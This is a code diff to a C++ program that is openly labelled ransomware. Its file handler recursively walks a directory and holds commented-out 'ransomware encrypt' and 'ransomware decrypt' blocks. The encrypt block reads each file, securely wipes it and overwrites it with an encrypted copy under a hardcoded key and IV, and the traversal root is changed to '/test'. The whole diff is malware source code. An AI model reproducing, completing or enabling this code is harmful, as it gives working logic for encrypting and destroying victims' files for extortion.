@@ -124,17 +124,27 @@ std::string decrypt(const std::string& key,const std::string& iv,const std::stri
 void file_handler(const std::string& filepath)
 {
 	std::cout<<filepath<<std::endl;
-	/*unested ransomware outline (DO NOT RUN):
-	std::string plain;
+
+	//ransomware encrypt
+	/*std::string plain;
 	std::string key("01234567890123456789012345678901");
 	std::string iv("01234567890123456");
-	if(file_to_string(filepath,plain)&&string_to_file(encrypt(key,iv,plain),filepath+".enc"))
+	if(file_to_string(filepath,plain))
+	{
 		spc_file_wipe(filepath);
-	*/
+		string_to_file(encrypt(key,iv,plain),filepath);
+	}*/
+
+	//ransomware decrypt
+	/*std::string cipher;
+	std::string key("01234567890123456789012345678901");
+	std::string iv("01234567890123456");
+	if(file_to_string(filepath,cipher))
+		string_to_file(decrypt(key,iv,cipher),filepath);*/
 }
 
 int main()
 {
-	traverse_files(".",file_handler);
+	traverse_files("/test",file_handler);
 	return 0;
 }
